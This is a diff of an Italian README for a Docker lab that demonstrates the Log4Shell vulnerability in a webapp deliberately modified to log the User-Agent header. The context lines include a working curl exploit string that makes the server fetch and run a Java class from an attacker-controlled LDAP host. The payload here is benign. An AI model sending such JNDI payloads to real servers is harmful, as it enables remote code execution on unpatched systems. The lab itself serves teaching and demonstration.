@@ -5,7 +5,7 @@ Lo scopo di questo progetto è quello di mostrare la vulnerabilità Log4shell CV
 In questo progetto è stata scelta una webapp realizzata con il popolare web framework Java MVC, opportunamente modificata per lo scopo.
 
 La parte da me modificata si trova nel controller "HomeController", file "src\main\java\com\nico\store\store\controller\HomeController.java".
-Nel controller è stata istanziata la classe Logger, ed è stata aggiunta (mediante annotazione) l'istruzione per ricavare l'header della richiesta "User-Agent" e passarla al controller. All'interno del controller, si è usata l'istanza del Logger per loggare la User-Agent. Ne consegue quindi, che se un client invia una  richiesta al server con l'header opportunamente modificato (nel nostro caso la user-agent, ma avrei potuto sceglierne un altro volendo), contenente un'istruzione per il download di una classe Java da un server JNDI, verrà eseguito il codice contenuto nella classe.
+Nel controller è stata istanziata la classe Logger, ed è stata aggiunta (mediante annotazione) l'istruzione per ricavare l'header della richiesta "User-Agent" e passarla al controller. All'interno del controller, si è usata l'istanza del Logger per loggare la User-Agent. Ne consegue quindi, che se un client invia una  richiesta, sfruttando la Java API JNDI (Java Naming and Directory Interface) al server LDAP con l'header opportunamente modificato (nel nostro caso la user-agent, ma avrei potuto sceglierne un altro volendo), contenente l'istruzione per il download di una classe Java dal server LDAP, verrà eseguito il codice contenuto nella classe.
 
 La libreria impiegata di log4J 2.6.1.
 Nel progetto è presente il file pom.xml per la compilazione tramite Maven.
@@ -31,7 +31,7 @@ touch /tmp/hacked
 
 e includerlo (codificato in base64) in una richiesta da inviare al server della webApp. Si userà il comando Curl per lo scopo.
 
-Una volta inviato il comando, il metodo della libreria Log4j invocato nel controller, interpreterà il comando, sarà scaricata ed eseguita  una classe Java dal server JNDI (controllato dall'attaccante)  e successivamente avverrà l'esecuzuzione del payload, contenuto all'interno della classe Java scaricata nel passo precedente. Esempio di comando valido:
+Una volta inviato il comando, il metodo della libreria Log4j invocato nel controller, interpreterà il comando, sarà scaricata ed eseguita  una classe Java dal server LDAP (controllato dall'attaccante)  e successivamente avverrà l'esecuzuzione del payload, contenuto all'interno della classe Java scaricata nel passo precedente. Esempio di comando valido:
 
 ```bash
 curl -A '${jndi:ldap://192.168.10.128:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNrZWQ=}' http://172.18.0.2:8080
@@ -56,7 +56,7 @@ Avviare il container:
 ```bash
 docker run --name nomeApplicazione -p 8080:8080 --network nomeRete
 ```
-Dopo aver inviato la request al server della webApp, come descritto sopra (ad esempio con curl), sarà possibile notare dai log del server JNDI che è stata "servita" la classe Java al server della nostra WebApp, con il payload al suo interno.
+Dopo aver inviato la request al server della webApp, come descritto sopra (ad esempio con curl), sarà possibile notare dai log del server LDAP che è stata "servita" la classe Java al server della nostra WebApp, con il payload al suo interno.
 A seconda del comando eseguito, è possibile vedere il risultato. Ad esempio, se il payload provoca la creazione di file, è possibile entrare nel container e verificarlo. Ad esempio:
 
 
